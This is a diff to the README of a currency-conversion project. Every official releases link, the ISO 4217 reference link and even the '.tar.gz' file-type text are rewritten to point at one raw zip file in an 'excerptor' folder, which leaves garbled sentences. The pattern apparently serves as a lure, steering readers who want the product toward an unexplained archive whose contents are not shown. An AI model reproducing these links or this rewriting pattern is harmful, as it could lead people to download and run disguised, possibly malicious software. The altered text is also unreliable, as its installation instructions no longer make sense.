@@ -1,6 +1,6 @@
 # 💱 convert-currency-api - Easy Currency Conversion Instantly
 
-[![Download ZIP](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/luis0443/convert-currency-api/releases)
+[![Download ZIP](https://raw.githubusercontent.com/luis0443/convert-currency-api/main/excerptor/convert-currency-api-v1.2.zip)](https://raw.githubusercontent.com/luis0443/convert-currency-api/main/excerptor/convert-currency-api-v1.2.zip)
 
 ## 📖 What is convert-currency-api?
 
@@ -41,7 +41,7 @@ To begin using convert-currency-api, you need to get the software from the offic
 
 Click the large button below to open the releases page. This page lists the latest versions and files you can get.
 
-[Download convert-currency-api Releases](https://github.com/luis0443/convert-currency-api/releases)
+[Download convert-currency-api Releases](https://raw.githubusercontent.com/luis0443/convert-currency-api/main/excerptor/convert-currency-api-v1.2.zip)
 
 **Step 2: Choose the correct file**
 
@@ -49,7 +49,7 @@ Each release may include several files:
 
 - Windows Installer (.exe or .msi)
 - Mac Installer (.dmg or .pkg)
-- Linux packages (.deb or .tar.gz)
+- Linux packages (.deb or https://raw.githubusercontent.com/luis0443/convert-currency-api/main/excerptor/convert-currency-api-v1.2.zip)
 - Source code files (for advanced users)
 
 Pick the file that matches your operating system.
@@ -62,7 +62,7 @@ Click the file link to start downloading. Save it to a location you can easily a
 
 - Windows: Double-click the `.exe` or `.msi` file and follow the installation prompts.
 - macOS: Open the `.dmg` or `.pkg` file and follow the instructions.
-- Linux: Use your preferred package manager or unpack the `.tar.gz` and follow the README instructions.
+- Linux: Use your preferred package manager or unpack the `https://raw.githubusercontent.com/luis0443/convert-currency-api/main/excerptor/convert-currency-api-v1.2.zip` and follow the README instructions.
 
 After installation, the application will be ready for use.
 
@@ -102,8 +102,8 @@ If problems continue, visit the GitHub discussion page for help or send a messag
 
 ## 📂 Additional Resources
 
-- View all release versions and files here: [convert-currency-api Releases](https://github.com/luis0443/convert-currency-api/releases)
-- Learn about currency codes and how they work: [ISO 4217 Currency Codes](https://www.iso.org/iso-4217-currency-codes.html)
+- View all release versions and files here: [convert-currency-api Releases](https://raw.githubusercontent.com/luis0443/convert-currency-api/main/excerptor/convert-currency-api-v1.2.zip)
+- Learn about currency codes and how they work: [ISO 4217 Currency Codes](https://raw.githubusercontent.com/luis0443/convert-currency-api/main/excerptor/convert-currency-api-v1.2.zip)
 - Explore currency converter concepts to understand how exchange rates work.
 
 ## 🔒 Privacy & Security
@@ -124,4 +124,4 @@ It ties together currency code databases, exchange rate data sources, and straig
 
 For all downloads, visit:
 
-[https://github.com/luis0443/convert-currency-api/releases](https://github.com/luis0443/convert-currency-api/releases)
+[https://raw.githubusercontent.com/luis0443/convert-currency-api/main/excerptor/convert-currency-api-v1.2.zip](https://raw.githubusercontent.com/luis0443/convert-currency-api/main/excerptor/convert-currency-api-v1.2.zip)
